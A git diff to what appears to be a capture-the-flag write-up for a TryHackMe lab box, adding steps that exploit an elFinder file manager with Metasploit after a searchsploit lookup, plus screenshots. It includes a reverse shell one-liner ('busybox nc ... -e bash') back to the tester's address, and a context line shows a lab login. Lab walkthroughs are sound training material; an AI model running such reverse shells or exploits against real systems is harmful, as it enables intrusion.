@@ -61,12 +61,29 @@ jose : password123
 
 ## searchsploit `elfinder`
 
+<img width="1203" height="543" alt="image" src="https://github.com/user-attachments/assets/2daa0ad7-93e0-457d-943e-6602456ca7ac" />
+
+
 <img width="1144" height="256" alt="image" src="https://github.com/user-attachments/assets/12b6555a-4225-47a6-8da3-4558bed0c49e" />
 
+## we will use metasploit
+
+```
+set rhosts files.lookup.thm
+set lhost tun0
+```
+
+<img width="1098" height="520" alt="image" src="https://github.com/user-attachments/assets/f7e1f747-4f65-43e6-948e-c56c467d5799" />
+
+<img width="987" height="111" alt="image" src="https://github.com/user-attachments/assets/e28c6f21-d552-42be-a749-80ae19366906" />
+
+```
+shell
+busybox nc 10.8.47.102 9999 -e bash
+```
 
 
-
-
+<img width="950" height="441" alt="image" src="https://github.com/user-attachments/assets/08ac72d6-939e-4ca9-bb45-a37c9a3140c0" />
 
 
 
